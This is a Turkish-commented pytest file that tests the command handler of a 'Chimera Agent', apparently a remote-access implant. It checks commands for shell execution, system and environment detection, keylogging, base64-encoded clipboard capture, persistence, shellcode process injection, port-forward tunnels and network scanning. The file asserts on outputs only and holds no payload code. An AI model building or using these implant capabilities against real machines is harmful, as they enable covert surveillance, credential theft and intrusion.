"""
Chimera Agent - Komut Çalıştırma Testleri (test_commands.py)

Agent'ın tüm komut işleme yeteneklerini test eder:
  - Sistem komut çalıştırma (shell execute)
  - Özel komutlar (terminate, sysinfo, detect, screenshot vb.)
  - Keylogger komutları (keylogger_start, keylogger_stop, keylogger_dump)
  - Clipboard komutları (clipboard_get)
  - Persistence komutları
  - Port Forwarding komutları
  - Network Scanner komutları
  - Geçersiz komut hata yönetimi

Çalıştırma:
    pytest tests/chimera/test_commands.py -v
"""
import pytest
import sys
import base64
from unittest.mock import MagicMock, patch


# ============================================================
# Temel Komut Çalıştırma
# ============================================================

class TestBasicCommands:
    """Temel sistem komutu çalıştırma testleri."""

    def test_echo_command(self, agent):
        """echo komutu doğru çıktı verir."""
        result = agent.execute_command("echo chimera_test_1337")
        assert "chimera_test_1337" in result

    def test_invalid_command_returns_error(self, agent):
        """Var olmayan komut hata mesajı döner."""
        result = agent.execute_command("__komut_olmayan_12345__")
        assert len(result) > 0

    def test_empty_output_command(self, agent):
        """Çıktısı olmayan komut bilgi mesajı döner."""
        result = agent.execute_command("true")
        assert "Komut" in result and ("tamamlandı" in result or "başarıyla" in result)

    def test_command_with_pipe(self, agent):
        """Pipe içeren komut çalışır."""
        result = agent.execute_command("echo test123 | cat")
        assert "test123" in result

    def test_command_multiword(self, agent):
        """Boşluklu komut doğru çalışır."""
        result = agent.execute_command("echo hello world")
        assert "hello world" in result


# ============================================================
# Özel Komutlar
# ============================================================

class TestSpecialCommands:
    """Agent'ın tanıdığı özel komut testleri."""

    def test_terminate_stops_agent(self, agent):
        """terminate komutu agent'ı durdurur."""
        result = agent.execute_command("terminate")
        assert agent.running is False
        assert "sonlandırılıyor" in result

    def test_sysinfo_returns_system_info(self, agent):
        """sysinfo komutu sistem bilgilerini döner."""
        result = agent.execute_command("sysinfo")
        assert "SİSTEM BİLGİSİ" in result or "OS:" in result or "İşletim Sistemi" in result

    def test_sysinfo_contains_hostname(self, agent):
        """sysinfo çıktısı hostname içerir."""
        result = agent.execute_command("sysinfo")
        assert "Hostname" in result

    def test_sysinfo_contains_user(self, agent):
        """sysinfo çıktısı kullanıcı bilgisi içerir."""
        result = agent.execute_command("sysinfo")
        assert "Kullanıcı" in result

    def test_sysinfo_contains_python_version(self, agent):
        """sysinfo çıktısı Python versiyonu içerir."""
        result = agent.execute_command("sysinfo")
        assert "Python" in result

    def test_detect_returns_environment_info(self, agent):
        """detect komutu ortam analizi döner."""
        result = agent.execute_command("detect")
        assert len(result) > 0


# ============================================================
# Keylogger Komutları
# ============================================================

class TestKeyloggerCommands:
    """Keylogger ile ilgili komut testleri."""

    @pytest.mark.skipif(sys.platform != "win32", reason="Keylogger sadece Windows'ta desteklenir")
    def test_keylogger_start_on_windows(self, agent):
        """Windows'ta keylogger başlatılabilir."""
        result = agent.execute_command("keylogger_start")
        assert "başlatıldı" in result or "çalışıyor" in result

    @pytest.mark.skipif(sys.platform == "win32", reason="Non-Windows testi")
    def test_keylogger_start_non_windows(self, agent):
        """Windows dışında keylogger hata mesajı verir."""
        result = agent.execute_command("keylogger_start")
        assert "Windows" in result or "desteklenmemektedir" in result

    def test_keylogger_stop_when_not_running(self, agent):
        """Çalışmayan keylogger'ı durdurmaya çalışmak hata verir."""
        result = agent.execute_command("keylogger_stop")
        assert "çalışmıyor" in result

    def test_keylogger_dump_empty(self, agent):
        """Boş keylogger dump KEYLOGGER_EMPTY döner."""
        result = agent.execute_command("keylogger_dump")
        # Boş olduğu duumda KEYLOGGER_EMPTY veya Base64 encoded string döner
        assert "KEYLOGGER_EMPTY" in result or "KEYLOG_DUMP:" in result


# ============================================================
# Clipboard Komutları
# ============================================================

class TestClipboardCommands:
    """Clipboard ile ilgili komut testleri."""

    def test_clipboard_get_returns_data(self, agent):
        """clipboard_get komutu CLIPBOARD_DATA: prefix'i ile yanıt verir."""
        result = agent.execute_command("clipboard_get")
        # Pano boş veya erişilemez olsa bile format doğru olmalı
        assert "CLIPBOARD_DATA:" in result

    def test_clipboard_get_base64_encoded(self, agent):
        """clipboard_get sonucu base64 encoded olmalı."""
        result = agent.execute_command("clipboard_get")
        if "CLIPBOARD_DATA:" in result:
            b64_part = result.split("CLIPBOARD_DATA:")[1]
            # Base64 decode edilebilir olmalı
            try:
                base64.b64decode(b64_part)
                valid_b64 = True
            except Exception:
                valid_b64 = False
            assert valid_b64


# ============================================================
# Persistence Komutları
# ============================================================

class TestPersistenceCommands:
    """Kalıcılık komutlarının test edilmesi."""

    def test_persistence_install_returns_result(self, agent):
        """persistence_install bir sonuç döner."""
        result = agent.execute_command("persistence_install")
        assert len(result) > 0

    def test_persistence_remove_returns_result(self, agent):
        """persistence_remove bir sonuç döner."""
        result = agent.execute_command("persistence_remove")
        assert len(result) > 0


# ============================================================
# Process Injection Komutları
# ============================================================

class TestInjectionCommands:
    """Process injection komut testleri."""

    @pytest.mark.skipif(sys.platform != "win32", reason="Process injection sadece Windows'ta")
    def test_inject_list(self, agent):
        """inject_list komutu process listesi döner."""
        result = agent.execute_command("inject_list")
        assert len(result) > 0

    def test_inject_shellcode_missing_args(self, agent):
        """inject_shellcode eksik parametre ile hata verir."""
        result = agent.execute_command("inject_shellcode")
        # Sonuç boş değilse — ya hata mesajı ya da kullanım bilgisi dönmeli
        assert len(result) > 0

    def test_inject_shellcode_invalid_pid(self, agent):
        """inject_shellcode geçersiz PID ile hata verir."""
        result = agent.execute_command("inject_shellcode abc deadbeef")
        assert "Geçersiz" in result or "hatası" in result or len(result) > 0


# ============================================================
# Port Forwarding Komutları
# ============================================================

class TestPortForwardingCommands:
    """Port forwarding komut testleri."""

    def test_portfwd_list_empty(self, agent):
        """Başlangıçta aktif tünel yok."""
        result = agent.execute_command("portfwd list")
        assert "yok" in result.lower() or "Aktif" in result

    def test_portfwd_stop_no_tunnels(self, agent):
        """Tünel yokken portfwd stop bilgi mesajı döner."""
        result = agent.execute_command("portfwd stop")
        assert len(result) > 0


# ============================================================
# Network Scanner Komutları
# ============================================================

class TestNetworkScannerCommands:
    """Ağ tarama komut testleri."""

    def test_netscan_with_no_args(self, agent):
        """netscan komutu argümansız çağrıldığında bilgi döner."""
        result = agent.execute_command("netscan")
        assert len(result) > 0


# ============================================================
# Command Komut Case-Insensitivity
# ============================================================

class TestCommandCaseInsensitivity:
    """Komutların büyük/küçük harf duyarsız olduğu testler."""

    def test_terminate_lowercase(self, agent):
        """terminate küçük harf ile çalışır."""
        result = agent.execute_command("terminate")
        assert "sonlandırılıyor" in result

    def test_sysinfo_mixed_case(self, agent):
        """SYSINFO büyük harf ile çalışır."""
        agent2_running = agent.running
        result = agent.execute_command("SYSINFO")
        # Büyük harfle çalışıyor mu yoksa sistem komutu olarak mı gidiyor kontrolü
        # Agent cmd_lower kullanıyor bu yüzden case insensitive olmalı
        assert len(result) > 0
